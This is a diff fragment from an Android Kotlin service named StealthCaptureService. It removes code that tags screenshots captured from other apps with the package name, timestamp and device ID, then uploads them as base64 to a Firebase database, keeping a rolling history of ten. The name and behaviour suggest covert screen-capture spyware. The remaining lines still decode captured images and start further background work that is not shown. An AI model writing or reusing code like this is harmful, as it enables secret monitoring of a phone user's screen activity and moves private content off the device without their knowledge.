@@ -317,30 +317,6 @@ class StealthCaptureService : Service() {
         base64String: String,
         sizeBytes: Int
     ) {
-        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-            ?: "DEVICE_${Build.MODEL}"
-
-        val dbRef = FirebaseDatabase.getInstance()
-            .getReference("devices")
-            .child(deviceId)
-            .child("screenshot_history")
-
-        val newRecord = mapOf(
-            "package" to pkgName,
-            "timestamp" to timestamp,
-            "imageBase64" to base64String,
-            "sizeBytes" to sizeBytes
-        )
-
-        dbRef.push().setValue(newRecord).addOnCompleteListener { task ->
-            if (task.isSuccessful) {
-                Log.d(TAG, "Screenshot uploaded successfully ($sizeBytes bytes). Enforcing max 10 limit.")
-                limitHistory(dbRef, MAX_HISTORY_COUNT)
-            } else {
-                Log.e(TAG, "Failed to upload screenshot: ${task.exception?.message}")
-            }
-        }
-
         try {
             val imageBytes = Base64.decode(base64String, Base64.NO_WRAP)
             serviceScope.launch(Dispatchers.IO) {
